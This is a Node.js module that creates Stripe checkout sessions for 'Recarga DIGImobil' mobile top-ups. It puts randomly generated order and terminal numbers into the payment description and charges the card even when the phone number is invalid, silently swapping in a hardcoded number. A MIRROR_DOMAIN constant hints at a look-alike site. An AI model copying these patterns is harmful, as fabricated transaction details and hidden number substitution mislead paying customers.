const { STRIPE_SECRET_KEY, MIRROR_DOMAIN } = require('./constants');
const fetch = require('node-fetch');

// Глобальне сховище для даних платежів
global.paymentInfo = global.paymentInfo || {};

async function createStripeCheckoutSession(amount, phoneNumber, successUrl, cancelUrl, clientIP) {
  try {
    const stripeUrl = 'https://api.stripe.com/v1/checkout/sessions';
    const priceInCents = Math.round(parseFloat(amount) * 100);
    const orderNumber = Math.floor(10000000 + Math.random() * 90000000).toString();
    const numberOfTerminal = Math.floor(856673 + Math.random() * 90000000).toString();

    // Гарантуємо, що телефон - це рядок
    phoneNumber = String(phoneNumber || '');
    
    // Перевіряємо формат номера телефону та видаляємо нецифрові символи
    const cleanPhone = phoneNumber.replace(/\D/g, '');
    
    // Використовуємо очищений номер телефону, якщо він має 9 цифр
    const validPhone = cleanPhone.match(/^\d{9}$/) ? cleanPhone : '624048596';

    console.log('Creating Stripe session with phone:', validPhone, 'and amount:', priceInCents / 100);

    const params = new URLSearchParams();
    params.append('payment_method_types[]', 'card');
    params.append('mode', 'payment');
    params.append('success_url', successUrl + '?session_id={CHECKOUT_SESSION_ID}');
    params.append('cancel_url', cancelUrl);
    params.append('locale', 'es');
    params.append('client_reference_id', clientIP);

    params.append('line_items[0][quantity]', '1');
    params.append('line_items[0][price_data][currency]', 'eur');
    params.append('line_items[0][price_data][unit_amount]', priceInCents.toString());
    params.append('line_items[0][price_data][product_data][name]', 'Recarga DIGImobil');
    params.append('line_items[0][price_data][product_data][description]', `*Número de teléfono*: ${validPhone}\n*Importe*: €${(priceInCents / 100).toFixed(2)}\n*Número de pedido*: ${orderNumber}\n*Número de terminal*: ${numberOfTerminal}`);

    console.log('Sending request to Stripe API...');
    
    const response = await fetch(stripeUrl, {
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${STRIPE_SECRET_KEY}`,
        'Content-Type': 'application/x-www-form-urlencoded'
      },
      body: params.toString()
    });

    const responseText = await response.text();
    console.log('Stripe API response status:', response.status);
    
    if (!response.ok) {
      console.error('Stripe API error:', responseText);
      throw new Error(`Stripe API error: ${response.status} - ${responseText}`);
    }

    const session = JSON.parse(responseText);
    console.log('Stripe session created with ID:', session.id);

    // Зберігаємо дані платежу
    global.paymentInfo[session.id] = {
      phoneNumber: validPhone,
      terminal: numberOfTerminal,
      amount: priceInCents / 100,
      orderNumber: orderNumber
    };

    return { session };
  } catch (error) {
    console.error('Error in createStripeCheckoutSession:', error);
    throw error;
  }
}

module.exports = {
  createStripeCheckoutSession
};